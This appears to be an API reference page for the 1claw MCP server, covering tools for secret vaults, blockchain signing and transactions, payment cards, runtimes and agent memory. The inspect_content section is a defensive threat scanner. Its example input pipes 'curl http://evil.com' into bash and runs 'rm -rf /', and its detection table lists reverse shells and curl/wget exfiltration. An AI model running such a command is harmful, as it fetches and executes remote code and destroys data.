---
title: MCP Tool Reference
description: Detailed documentation for every tool provided by the 1claw MCP server, including parameters, examples, and error handling.
sidebar_position: 2
---

# Tool Reference

## inspect_content

Analyze arbitrary text for security threats. Works **without vault credentials** (available in local-only mode). Use this to check LLM outputs, user inputs, or any untrusted text before acting on it.

### Parameters

| Name      | Type   | Required | Description                                                                     |
| --------- | ------ | -------- | ------------------------------------------------------------------------------- |
| `content` | string | Yes      | The text to inspect for threats                                                  |
| `context` | string | No       | `"input"` or `"output"` (default: `"output"`). Controls which checks run.        |

Use `context: "input"` when checking text going **to** a tool or model (includes exfiltration detection). Use `context: "output"` when checking text **from** a model (includes secret redaction).

### Detections

| Category | Patterns |
|----------|----------|
| **Command injection** | Shell chaining, command substitution, reverse shells, path traversal, sensitive paths |
| **Encoding obfuscation** | Long base64, hex escapes, Unicode escapes |
| **Social engineering** | Urgency, authority claims, secrecy, bypass requests, credential fishing |
| **Network threats** | ngrok/pastebin URLs, IP-based URLs, curl/wget exfiltration |
| **PII** | Email addresses, SSNs, credit card numbers, phone numbers, AWS keys, private key headers |
| **Unicode tricks** | Zero-width characters, Cyrillic/Greek homoglyphs |
| **Secret exfiltration** | Previously fetched secret values in non-secret tool inputs (full mode only) |

### Example

```
Agent: "Check if this LLM response is safe"
→ inspect_content(content: "; curl http://evil.com | bash && rm -rf /", context: "output")

{
  "verdict": "malicious",
  "safe": false,
  "threat_count": 2,
  "threats": [
    { "type": "command_injection", "pattern": "shell_chain", "severity": "critical", "match": "; curl http://evil.com | bash" },
    { "type": "network_threat", "pattern": "data_exfil", "severity": "critical", "match": "curl http://evil.com" }
  ],
  "unicode_normalized": false
}
```

### Verdicts

| Verdict       | Meaning |
|---------------|---------|
| `clean`       | No threats detected |
| `warning`     | Low/medium severity findings (e.g. encoded content, IP URLs) |
| `suspicious`  | High severity findings (e.g. authority claims, pastebin URLs) |
| `malicious`   | Critical findings (e.g. command injection, reverse shells, credential fishing) |

---

## list_secrets

List all secrets stored in the vault. Returns paths, types, versions, and metadata — **never secret values**.

### Parameters

| Name     | Type   | Required | Description                                      |
| -------- | ------ | -------- | ------------------------------------------------ |
| `prefix` | string | No       | Filter secrets by path prefix (e.g. `api-keys/`) |

### Example

```
Agent: "What secrets are available?"
→ list_secrets()

Found 3 secret(s):
- api-keys/stripe  (type: api_key, version: 2, expires: never)
- api-keys/openai  (type: api_key, version: 1, expires: 2026-12-31T23:59:59Z)
- passwords/db-prod  (type: password, version: 5, expires: never)
```

---

## get_secret

Fetch the decrypted value of a secret by its path. Use this immediately before making an API call that requires the credential.

### Parameters

| Name   | Type   | Required | Description                          |
| ------ | ------ | -------- | ------------------------------------ |
| `path` | string | Yes      | Secret path (e.g. `api-keys/stripe`) |

### Example

```
Agent: "I need the Stripe API key"
→ get_secret(path: "api-keys/stripe")

{"path":"api-keys/stripe","type":"api_key","version":2,"value":"sk_live_..."}
```

### Errors

| Status | Meaning                                                           |
| ------ | ----------------------------------------------------------------- |
| 404    | No secret found at this path                                      |
| 410    | Secret is expired or has exceeded its maximum access count        |
| 402    | Free tier quota exhausted — upgrade at 1claw.xyz/settings/billing |

---

## put_secret

Create a new secret or update an existing one. Each call creates a new version.

### Parameters

| Name               | Type   | Required | Description                                                                                                                            |
| ------------------ | ------ | -------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| `path`             | string | Yes      | Secret path (e.g. `api-keys/stripe`)                                                                                                   |
| `value`            | string | Yes      | The secret value to store                                                                                                              |
| `type`             | string | No       | Secret type. Default: `api_key`. Options: `api_key`, `password`, `private_key`, `certificate`, `file`, `note`, `ssh_key`, `env_bundle` |
| `metadata`         | object | No       | Arbitrary JSON metadata to attach                                                                                                      |
| `expires_at`       | string | No       | ISO 8601 expiry datetime                                                                                                               |
| `max_access_count` | number | No       | Auto-expire after this many reads                                                                                                      |

### Example

```
Agent: "Store this new API key"
→ put_secret(path: "api-keys/stripe", value: "sk_live_new...", type: "api_key")

Secret stored at 'api-keys/stripe' (version 3, type: api_key).
```

---

## delete_secret

Soft-delete a secret. All versions are marked as deleted. This is reversible by an admin.

### Parameters

| Name   | Type   | Required | Description           |
| ------ | ------ | -------- | --------------------- |
| `path` | string | Yes      | Secret path to delete |

### Example

```
Agent: "Delete the old Stripe key"
→ delete_secret(path: "api-keys/old-stripe")

Secret at 'api-keys/old-stripe' has been soft-deleted.
```

---

## describe_secret

Get metadata for a secret without fetching its value. Use this to check if a secret exists or is still valid.

### Parameters

| Name   | Type   | Required | Description             |
| ------ | ------ | -------- | ----------------------- |
| `path` | string | Yes      | Secret path to describe |

### Example

```
Agent: "Is the Stripe key still valid?"
→ describe_secret(path: "api-keys/stripe")

{
  "path": "api-keys/stripe",
  "type": "api_key",
  "version": 2,
  "metadata": {},
  "created_at": "2026-01-15T10:30:00Z",
  "expires_at": null
}
```

---

## rotate_and_store

Store a new value for an existing secret, creating a new version. Useful when an agent has regenerated an API key and needs to persist it.

### Parameters

| Name    | Type   | Required | Description           |
| ------- | ------ | -------- | --------------------- |
| `path`  | string | Yes      | Secret path to rotate |
| `value` | string | Yes      | The new secret value  |

### Example

```
Agent: "I regenerated the Stripe key, store the new one"
→ rotate_and_store(path: "api-keys/stripe", value: "sk_live_rotated...")

Rotated secret at 'api-keys/stripe'. New version: 3.
```

---

## get_env_bundle

Fetch a secret of type `env_bundle`, parse its `KEY=VALUE` lines, and return a structured JSON object. Useful for injecting environment variables into subprocesses.

### Parameters

| Name   | Type   | Required | Description                    |
| ------ | ------ | -------- | ------------------------------ |
| `path` | string | Yes      | Path to an `env_bundle` secret |

### Example

```
Agent: "Get the production environment variables"
→ get_env_bundle(path: "config/prod-env")

{
  "DATABASE_URL": "postgres://...",
  "REDIS_URL": "redis://...",
  "API_KEY": "sk_..."
}
```

The secret value should contain one `KEY=VALUE` per line. Lines starting with `#` and blank lines are ignored.

---

## create_vault

Create a new vault for organizing secrets.

### Parameters

| Name          | Type   | Required | Description                        |
| ------------- | ------ | -------- | ---------------------------------- |
| `name`        | string | Yes      | Vault name                         |
| `description` | string | No       | Description of the vault's purpose |

### Example

```
Agent: "Create a vault for production API keys"
→ create_vault(name: "prod-keys", description: "Production API credentials")

Vault 'prod-keys' created (id: ae370174-...).
```

---

## list_vaults

List all vaults accessible to the authenticated agent.

### Parameters

None.

### Example

```
Agent: "What vaults do I have access to?"
→ list_vaults()

Found 2 vault(s):
- prod-keys (ae370174-...)
- staging (bf481285-...)
```

---

## grant_access

Grant a user or agent access to a vault by creating an access policy.

### Parameters

| Name                  | Type     | Required | Description                                                           |
| --------------------- | -------- | -------- | --------------------------------------------------------------------- |
| `vault_id`            | string   | Yes      | UUID of the vault                                                     |
| `principal_type`      | string   | Yes      | `user` or `agent`                                                     |
| `principal_id`        | string   | Yes      | UUID of the user or agent                                             |
| `permissions`         | string[] | No       | Array of permissions: `read`, `write`, `delete` (default: `["read"]`) |
| `secret_path_pattern` | string   | No       | Glob pattern to restrict access (default: `**` — all secrets)         |

### Example

```
Agent: "Give agent abc123 read access to the prod-keys vault"
→ grant_access(vault_id: "ae370174-...", principal_type: "agent", principal_id: "abc123", permissions: ["read"])

Access granted to agent abc123 on vault prod-keys.
```

---

## share_secret

Share a secret with your creator (the human who registered you), a specific user or agent by ID, or create an open link. Use `recipient_type: "creator"` for the simplest agent-to-human sharing — no UUID or email needed.

### Parameters

| Name               | Type   | Required | Description                                                    |
| ------------------ | ------ | -------- | -------------------------------------------------------------- |
| `secret_id`        | string | Yes      | UUID of the secret to share                                    |
| `recipient_type`   | string | Yes      | `creator`, `user`, `agent`, or `anyone_with_link`              |
| `recipient_id`     | string | No       | UUID of the user or agent (required for `user`/`agent` types)  |
| `expires_at`       | string | Yes      | ISO 8601 expiry datetime (e.g. `2026-03-01T00:00:00Z`)         |
| `max_access_count` | number | No       | Maximum number of times the share can be accessed (default: 5) |

### Examples

```
Agent: "Share this key with the person who set me up"
→ share_secret(secret_id: "cf592...", recipient_type: "creator", expires_at: "2026-03-01T00:00:00Z")

Secret shared with your creator. Share ID: df703...
The recipient must accept the share before they can access the secret.
```

```
Agent: "Share this with agent abc123"
→ share_secret(secret_id: "cf592...", recipient_type: "agent", recipient_id: "abc123", max_access_count: 3)

Secret shared with agent abc123. Share ID: ef814...
```

---

## provision_signing_key

Provision an HSM-backed signing key for a blockchain. The private key is generated and stored in the `__agent-keys` vault — only the public key and derived address are returned.

### Parameters

| Name    | Type   | Required | Description                                                                  |
| ------- | ------ | -------- | ---------------------------------------------------------------------------- |
| `chain` | string | Yes      | Blockchain name: `ethereum`, `bitcoin`, `solana`, `xrp`, `cardano`, `tron`   |

### Example

```
Agent: "Create an Ethereum signing key for me"
→ provision_signing_key(chain: "ethereum")

Signing key created for ethereum:
  Public key: 0x04abc123...
  Address: 0x1234abcd...
  Curve: secp256k1
  Key version: 1
```

---

## list_signing_keys

List all active signing keys for the current agent.

### Parameters

None.

### Example

```
Agent: "What signing keys do I have?"
→ list_signing_keys()

Found 3 signing key(s):
- ethereum: 0x1234... (secp256k1, v1)
- solana: 7xKq3... (ed25519, v1)
- bitcoin: bc1q8... (secp256k1, v2)
```

---

## sign_message

Sign an EIP-191 personal message. Requires `message_signing_enabled: true` on the agent.

### Parameters

| Name      | Type   | Required | Description                                             |
| --------- | ------ | -------- | ------------------------------------------------------- |
| `message` | string | Yes      | The message to sign (UTF-8 string or hex-encoded bytes) |
| `chain`   | string | Yes      | Chain name (e.g. `ethereum`)                            |

### Example

```
Agent: "Sign this message to prove my identity"
→ sign_message(message: "Hello from my agent", chain: "ethereum")

{
  "signature": "0x3045...",
  "message_hash": "0xabcd...",
  "from": "0x1234..."
}
```

---

## sign_typed_data

Sign EIP-712 typed structured data (e.g. ERC-20 Permit, gasless approvals). The agent's `eip712_domain_allowlist` must include the `verifyingContract`.

### Parameters

| Name         | Type   | Required | Description                                      |
| ------------ | ------ | -------- | ------------------------------------------------ |
| `chain`      | string | Yes      | Chain name (e.g. `ethereum`)                     |
| `typed_data` | object | Yes      | Full EIP-712 JSON (types, primaryType, domain, message) |

### Example

```
Agent: "Sign this Permit for USDC approval"
→ sign_typed_data(chain: "ethereum", typed_data: { types: {...}, primaryType: "Permit", domain: {...}, message: {...} })

{
  "signature": "0x3046...",
  "typed_data_hash": "0xef01...",
  "from": "0x1234..."
}
```

---

## sign_digest

Sign a client-computed 32-byte digest **directly** (raw/blind signing). Returns a 65-byte `r‖s‖v` signature that recovers to the agent's EOA. Use this for **ERC-1271 / ERC-7739** nested EIP-712 flows (e.g. **Polymarket** CLOB orders) where the canonical hash is computed client-side and must match the verifier exactly.

:::warning Blind signing
No domain/transaction inspection is performed and guardrails are bypassed. The agent must have **`raw_signing_enabled: true`** (set by a human; agents cannot self-enable) or the call returns 403. Every use is audit-logged as `signing_key.raw_digest_sign`.
:::

### Parameters

| Name    | Type   | Required | Description                                          |
| ------- | ------ | -------- | ---------------------------------------------------- |
| `chain` | string | Yes      | Chain name (e.g. `ethereum`)                         |
| `hash`  | string | Yes      | 0x-prefixed 32-byte (64 hex char) digest to sign     |

### Example

```
Agent: "Sign this Polymarket order digest"
→ sign_digest(chain: "ethereum", hash: "0x59c6...690d")

{
  "signature": "0x3046...",
  "from": "0x1234..."
}
```

---

## submit_transaction

Sign and broadcast a transaction. Optionally simulate first via Tenderly.

### Parameters

| Name               | Type    | Required | Description                                                      |
| ------------------ | ------- | -------- | ---------------------------------------------------------------- |
| `chain`            | string  | Yes      | Chain name (e.g. `base`, `ethereum`, `sepolia`)                  |
| `to`               | string  | Yes      | Recipient address                                                |
| `value`            | string  | No       | Value in ETH (e.g. `"0.1"`)                                     |
| `data`             | string  | No       | Calldata hex (e.g. `"0x"`)                                      |
| `signing_key_path` | string  | No       | Vault path to signing key (default: `keys/{chain}-signer`)       |
| `simulate_first`   | boolean | No       | Run Tenderly simulation before signing (default: true)           |

### Example

```
Agent: "Send 0.01 ETH on Base"
→ submit_transaction(chain: "base", to: "0xRecipient...", value: "0.01", simulate_first: true)

Transaction broadcast:
  tx_hash: 0xabc123...
  status: broadcast
  chain: base
```

---

## sign_transaction

Sign a transaction without broadcasting (BYORPC). Same parameters as `submit_transaction`.

### Example

```
Agent: "Sign this transaction but don't broadcast it"
→ sign_transaction(chain: "ethereum", to: "0xRecipient...", value: "0.5")

Transaction signed (not broadcast):
  signed_tx: 0x02f870...
  tx_hash: 0xdef456...
  from: 0x1234...
```

---

## simulate_transaction

Simulate a transaction via Tenderly without signing or broadcasting.

### Parameters

Same as `submit_transaction` (minus `simulate_first`).

### Example

```
Agent: "Simulate sending 1 ETH on Ethereum"
→ simulate_transaction(chain: "ethereum", to: "0xRecipient...", value: "1.0")

Simulation result:
  status: success
  gas_used: 21000
  balance_changes: [...]
```

---

## simulate_bundle

Simulate multiple transactions sequentially (e.g. approve + swap).

### Parameters

| Name           | Type    | Required | Description                         |
| -------------- | ------- | -------- | ----------------------------------- |
| `transactions` | array   | Yes      | Array of transaction objects         |

### Example

```
Agent: "Simulate approve then swap on Base"
→ simulate_bundle(transactions: [{ chain: "base", to: "0xToken", data: "0xapprove..." }, { chain: "base", to: "0xRouter", data: "0xswap..." }])

Bundle simulation:
  Transaction 1: success (gas: 46000)
  Transaction 2: success (gas: 150000)
```

---

## list_transactions

List recent transactions for the current agent.

### Parameters

| Name                | Type    | Required | Description                                    |
| ------------------- | ------- | -------- | ---------------------------------------------- |
| `include_signed_tx` | boolean | No       | Include raw signed_tx hex (default: false)     |

### Example

```
Agent: "Show me my recent transactions"
→ list_transactions()

Found 3 transaction(s):
- 0xabc... (base, 0.1 ETH, broadcast)
- 0xdef... (ethereum, 0.5 ETH, sign_only)
- 0x123... (sepolia, 0.01 ETH, broadcast)
```

---

## get_transaction

Get details of a specific transaction.

### Parameters

| Name                | Type    | Required | Description                                    |
| ------------------- | ------- | -------- | ---------------------------------------------- |
| `transaction_id`    | string  | Yes      | UUID of the transaction                        |
| `include_signed_tx` | boolean | No       | Include raw signed_tx hex (default: false)     |

---

## rotate_generate

Server-side secret rotation. Generates a cryptographically random value as the next version of an existing secret — no client-side value needed.

### Parameters

| Name       | Type   | Required | Description                                                             |
| ---------- | ------ | -------- | ----------------------------------------------------------------------- |
| `path`     | string | Yes      | Secret path to rotate (e.g. `api-keys/stripe`)                         |
| `length`   | number | No       | Length of generated value (8–1024, default 32)                          |
| `charset`  | string | No       | Character set: `hex`, `base64`, `alphanumeric`, `ascii` (default: hex)  |

### Example

```
Agent: "Rotate the Stripe key with a new random value"
→ rotate_generate(path: "api-keys/stripe", length: 64, charset: "alphanumeric")

Rotated secret at 'api-keys/stripe' with server-generated value. New version: 4.
```

---

## list_versions

List all versions of a secret (newest first). Returns version numbers, timestamps, and status — **never secret values**.

### Parameters

| Name       | Type   | Required | Description                                    |
| ---------- | ------ | -------- | ---------------------------------------------- |
| `path`     | string | Yes      | Secret path (e.g. `api-keys/stripe`)           |

### Example

```
Agent: "Show me the version history of the Stripe key"
→ list_versions(path: "api-keys/stripe")

Found 3 version(s) for 'api-keys/stripe':
- v3 (current, created: 2026-05-10T14:22:00Z)
- v2 (created: 2026-03-01T09:15:00Z)
- v1 (disabled, created: 2026-01-15T10:30:00Z)
```

---

## platform_list_apps

List platform apps registered in the organization.

### Parameters

None.

### Example

```
Agent: "What platform apps does our org have?"
→ platform_list_apps()

Found 2 platform app(s):
- My DeFi Platform (slug: my-defi, billing: platform_pays, active)
- Analytics Service (slug: analytics, billing: user_pays, active)
```

---

## platform_create_app

Register a new platform app. Returns a `plt_` API key (one-time — it won't be shown again).

### Parameters

| Name            | Type   | Required | Description                                                                                 |
| --------------- | ------ | -------- | ------------------------------------------------------------------------------------------- |
| `name`          | string | Yes      | Display name for the platform app                                                           |
| `slug`          | string | Yes      | Unique URL-safe identifier (3–64 chars)                                                     |
| `description`   | string | No       | Description of the platform app                                                             |
| `billing_model` | string | No       | `platform_pays` (default), `user_pays`, or `hybrid`                                         |
| `auth_mode`     | string | No       | `silent` (default), `user_signin`, or `configurable`                                        |

### Example

```
Agent: "Create a new platform app for our Telegram bot"
→ platform_create_app(name: "TG Trading Bot", slug: "tg-trading", description: "Telegram DeFi bot", billing_model: "platform_pays", auth_mode: "silent")

Platform app created:
  App ID: f8a3b1c2-...
  Slug: tg-trading
  API Key: plt_abc123... (save this — shown once only)
```

---

## platform_bootstrap_user

Bootstrap resources for a connected user from a template. Creates a vault, agent(s), policies, and optionally signing keys as defined in the template spec. Returns a claim URL for the user.

### Parameters

| Name            | Type   | Required | Description                                           |
| --------------- | ------ | -------- | ----------------------------------------------------- |
| `connection_id` | string | Yes      | UUID of the platform user connection (from `upsert`)  |
| `template_id`   | string | Yes      | UUID of the bootstrap template to apply               |

### Example

```
Agent: "Bootstrap the new user with the DeFi template"
→ platform_bootstrap_user(connection_id: "d4e5f6a7-...", template_id: "b1c2d3e4-...")

User bootstrapped:
  Claim URL: https://1claw.xyz/connect/tg-trading/claim/ct_...
  Vault ID: ae370174-...
  Agent ID: bf481285-...
  Policies: 2 created
```

---

## lease_bankr_key

Lease a short-lived Bankr wallet API key for the current agent. Requires explicit policy on `agents/{id}/bankr/*` in `__agent-keys`.

### Parameters

| Name       | Type   | Required | Description                                              |
| ---------- | ------ | -------- | -------------------------------------------------------- |
| `ttl`      | number | No       | Lease TTL in seconds (default: 900, max: 86400)          |
| `wallet_id`| string | No       | Bankr wallet ID (defaults to org-configured default)     |

### Example

```
Agent: "I need a Bankr API key to check wallet balances"
→ lease_bankr_key(ttl: 600)

Bankr key leased:
  Lease ID: a1b2c3d4-...
  Expires in: 600s
  Wallet ID: wlt_default
```

Note: The `bk_usr_` API key value is NOT returned in the MCP tool output — Shroud resolves it server-side when `X-Shroud-Provider: bankr` is used.

---

## treasury_propose

Create a treasury multisig proposal.

### Parameters

| Name          | Type   | Required | Description                                   |
| ------------- | ------ | -------- | --------------------------------------------- |
| `treasury_id` | string | Yes      | UUID of the treasury                          |
| `to`          | string | Yes      | Recipient address                             |
| `value`       | string | Yes      | Value in wei                                  |
| `chain`       | string | Yes      | Chain name (e.g. `ethereum`)                  |
| `data`        | string | No       | Calldata hex (default: `"0x"`)                |

### Example

```
Agent: "Propose sending 0.1 ETH from the team treasury"
→ treasury_propose(treasury_id: "abc123-...", to: "0xRecipient...", value: "100000000000000000", chain: "ethereum")

Proposal created:
  ID: def456-...
  Status: pending
  Threshold: 2/3 signatures needed
```

---

## treasury_sign_proposal

Sign (approve or reject) a treasury multisig proposal.

### Parameters

| Name          | Type   | Required | Description                                        |
| ------------- | ------ | -------- | -------------------------------------------------- |
| `treasury_id` | string | Yes      | UUID of the treasury                               |
| `proposal_id` | string | Yes      | UUID of the proposal                               |
| `signature`   | string | Yes      | EIP-712 signature hex                              |
| `decision`    | string | Yes      | `approve` or `reject`                              |

---

## treasury_list_proposals

List proposals for a treasury.

### Parameters

| Name          | Type   | Required | Description                                   |
| ------------- | ------ | -------- | --------------------------------------------- |
| `treasury_id` | string | Yes      | UUID of the treasury                          |
| `status`      | string | No       | Filter by status (e.g. `pending`, `executed`) |

---

## execute_http

Execute an HTTP request through a named binding. Requires `execution_intents_enabled` on the agent.

### Parameters

| Name      | Type   | Required | Description                                   |
| --------- | ------ | -------- | --------------------------------------------- |
| `binding` | string | Yes      | Binding name (e.g. `stripe-api`)              |
| `method`  | string | No       | HTTP method (default `GET`)                   |
| `path`    | string | Yes      | Path and query (e.g. `/v1/customers`)         |
| `body`    | string | No       | Request body                                  |
| `headers` | object | No       | Extra headers (auth injected server-side)     |

---

## execute_intent

Generic execution for HTTP, GraphQL, and other binding types.

### Parameters

| Name             | Type   | Required | Description                                |
| ---------------- | ------ | -------- | ------------------------------------------ |
| `binding`        | string | Yes      | Binding name                               |
| `intent_type`    | string | Yes      | `http`, `graphql`, etc.                    |
| `params`         | object | Yes      | Type-specific params (e.g. GraphQL query)  |
| `execution_mode` | string | No       | `vault` (default) or `tee` when available  |

---

## list_bindings

List bindings for the current agent. Returns `credential_set` — never credential values.

---

## create_binding

Create a binding (human-only).

### Parameters

| Name           | Type   | Required | Description              |
| -------------- | ------ | -------- | ------------------------ |
| `name`         | string | Yes      | Unique binding name      |
| `binding_type` | string | Yes      | `http`, `graphql`, etc.  |
| `config`       | object | Yes      | Connection config        |
| `credential`   | string | No       | Credential (write-only)  |

---

## test_binding

Test binding connectivity (same SSRF/allowlist checks as execute).

### Parameters

| Name         | Type   | Required | Description  |
| ------------ | ------ | -------- | ------------ |
| `binding_id` | string | Yes      | Binding UUID |

---

## list_executions

List recent execution events for the agent.

### Parameters

| Name     | Type   | Required | Description                       |
| -------- | ------ | -------- | --------------------------------- |
| `limit`  | number | No       | Max events (default 20)           |
| `status` | string | No       | `success`, `error`, or `denied`   |

---

## order_card

Order a prepaid card via x402 payment on Base. The agent never sees the PAN.

### Parameters

| Name         | Type   | Required | Description                              |
| ------------ | ------ | -------- | ---------------------------------------- |
| `amount_usd` | string | Yes      | Amount in USD (e.g. `"25.00"`)           |
| `kind`       | string | No       | `prepaid` (default) or `gift_card`       |
| `country`    | string | No       | ISO country code for gift card search    |

---

## order_gift_card

Order a gift card for a specific brand/server.

### Parameters

| Name             | Type   | Required | Description                        |
| ---------------- | ------ | -------- | ---------------------------------- |
| `amount_usd`     | string | Yes      | Amount in USD                      |
| `laso_server_id` | string | Yes      | Server ID from `search_gift_cards` |
| `country`        | string | No       | ISO country code                   |

---

## search_gift_cards

Search available gift card brands by keyword.

### Parameters

| Name      | Type   | Required | Description              |
| --------- | ------ | -------- | ------------------------ |
| `query`   | string | Yes      | Brand name to search for |
| `country` | string | No       | ISO country code filter  |

---

## list_cards

List all payment cards for the current agent (masked to last4).

---

## get_card_status

Get the status and details of a specific card (masked).

### Parameters

| Name      | Type   | Required | Description |
| --------- | ------ | -------- | ----------- |
| `card_id` | string | Yes      | Card UUID   |

:::warning
Card **reveal** is intentionally NOT available as an MCP tool. Revealing a live PAN/CVV in the model's context window would defeat the security model. Use the dashboard, SDK, or CLI with password re-authentication instead.
:::

---

## list_automations

List automations in the current organization (requires human or agent token with org access).

Returns automation id, name, `trigger_type`, and active status.

---

## trigger_automation

Manually fire an automation by ID. Returns the queued run record.

### Parameters

| Name            | Type   | Required | Description        |
| --------------- | ------ | -------- | ------------------ |
| `automation_id` | string | Yes      | Automation UUID    |

---

## runtime_logs

Fetch recent container logs for a runtime.

### Parameters

| Name         | Type   | Required | Description                              |
| ------------ | ------ | -------- | ---------------------------------------- |
| `runtime_id` | string | Yes      | Runtime UUID                             |
| `tail`       | number | No       | Number of recent lines (default **50**)  |

Response uses API shape `{ entries: [{ timestamp?, message, level? }] }`.

---

## runtime_status

Get the current status of a cloud runtime.

### Parameters

| Name         | Type   | Required | Description    |
| ------------ | ------ | -------- | -------------- |
| `runtime_id` | string | Yes      | Runtime UUID   |

---

## list_runtimes

List all cloud runtimes in the current organization.

---

## manage_runtime

Start, stop, or delete a cloud runtime.

### Parameters

| Name         | Type   | Required | Description                            |
| ------------ | ------ | -------- | -------------------------------------- |
| `runtime_id` | string | Yes      | Runtime UUID                           |
| `action`     | string | Yes      | `start`, `stop`, or `delete`           |

---

## put_memory

Store a value in agent memory.

### Parameters

| Name        | Type   | Required | Description                                      |
| ----------- | ------ | -------- | ------------------------------------------------ |
| `namespace` | string | No       | Memory namespace (default `default`)             |
| `key`       | string | Yes      | Memory key                                       |
| `value`     | string | Yes      | Value to store (max 64KB)                        |
| `tier`      | string | No       | `scratch` or `durable` (default `durable`)       |
| `ttl_secs`  | number | No       | TTL in seconds (scratch tier only)               |

---

## get_memory

Retrieve a value from agent memory.

### Parameters

| Name        | Type   | Required | Description                          |
| ----------- | ------ | -------- | ------------------------------------ |
| `namespace` | string | No       | Memory namespace (default `default`) |
| `key`       | string | Yes      | Memory key                           |

---

## list_memory

List memory entries in a namespace.

### Parameters

| Name        | Type   | Required | Description                          |
| ----------- | ------ | -------- | ------------------------------------ |
| `namespace` | string | No       | Memory namespace (default `default`) |

---

## delete_memory

Delete a memory entry.

### Parameters

| Name        | Type   | Required | Description                          |
| ----------- | ------ | -------- | ------------------------------------ |
| `namespace` | string | No       | Memory namespace (default `default`) |
| `key`       | string | Yes      | Memory key to delete                 |

---

## search_memory

Semantic search over agent memory using vector similarity.

### Parameters

| Name        | Type   | Required | Description                          |
| ----------- | ------ | -------- | ------------------------------------ |
| `namespace` | string | No       | Memory namespace (default `default`) |
| `query`     | string | Yes      | Natural language search query        |
| `top_k`     | number | No       | Number of results (default 5, max 50)|

---

## send_chat_message

Send a message to an agent and receive a response via Shroud LLM proxy.

### Parameters

| Name       | Type   | Required | Description                |
| ---------- | ------ | -------- | -------------------------- |
| `agent_id` | string | Yes      | Agent UUID                 |
| `message`  | string | Yes      | Message content            |
| `model`    | string | No       | LLM model override         |
| `provider` | string | No       | LLM provider override      |

---

## list_chat_conversations

List chat conversations for an agent.

### Parameters

| Name       | Type   | Required | Description    |
| ---------- | ------ | -------- | -------------- |
| `agent_id` | string | Yes      | Agent UUID     |

---

## create_channel

Create a messaging channel (Telegram, WhatsApp, or Discord) for an agent.

### Parameters

| Name           | Type   | Required | Description                               |
| -------------- | ------ | -------- | ----------------------------------------- |
| `agent_id`     | string | Yes      | Agent UUID                                |
| `channel_type` | string | Yes      | `telegram`, `whatsapp`, or `discord`      |
| `channel_name` | string | Yes      | Display name for the channel              |
| `metadata`     | object | No       | Channel-specific config (bot token, etc.) |

---

## list_channels

List messaging channels for an agent.

### Parameters

| Name       | Type   | Required | Description    |
| ---------- | ------ | -------- | -------------- |
| `agent_id` | string | Yes      | Agent UUID     |

---

## send_channel_message

Send an outbound message through a channel.

### Parameters

| Name         | Type   | Required | Description                   |
| ------------ | ------ | -------- | ----------------------------- |
| `agent_id`   | string | Yes      | Agent UUID                    |
| `channel_id` | string | Yes      | Channel UUID                  |
| `content`    | string | Yes      | Message content               |
| `chat_id`    | string | No       | External chat/thread ID       |

---

## search_agent_directory

Search the public agent directory.

### Parameters

| Name    | Type   | Required | Description                         |
| ------- | ------ | -------- | ----------------------------------- |
| `query` | string | No       | Search query                        |
| `tags`  | string | No       | Comma-separated tag filter          |
| `limit` | number | No       | Max results (default 20)            |

